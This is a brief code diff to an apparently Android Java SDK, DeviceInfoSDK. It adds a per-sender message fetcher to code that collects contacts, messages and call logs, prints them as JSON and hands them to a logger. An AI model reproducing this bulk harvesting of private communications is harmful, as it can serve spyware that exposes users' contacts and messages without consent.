@@ -34,6 +34,10 @@ public class DeviceInfoSDK {
         return CallLogFetcher.fetchCallLogs(context);
     }
 
+    public static List<String> getMessagesForSender(Context context, String senderId) {
+        return MessageFetcher.fetchMessagesForSender(context, senderId);
+    }
+
     public static void logData(Context context) {
         List<String> contacts = getContacts(context);
         List<String> messages = getMessages(context);
@@ -46,7 +50,6 @@ public class DeviceInfoSDK {
         // Serialize data
         String jsonData = new Gson().toJson(new DataPayload(contacts, messages, callLogs));
         System.out.println("JSON Payload: " + jsonData);
-
         // Send data
         DataLogger.logData(jsonData);
     }
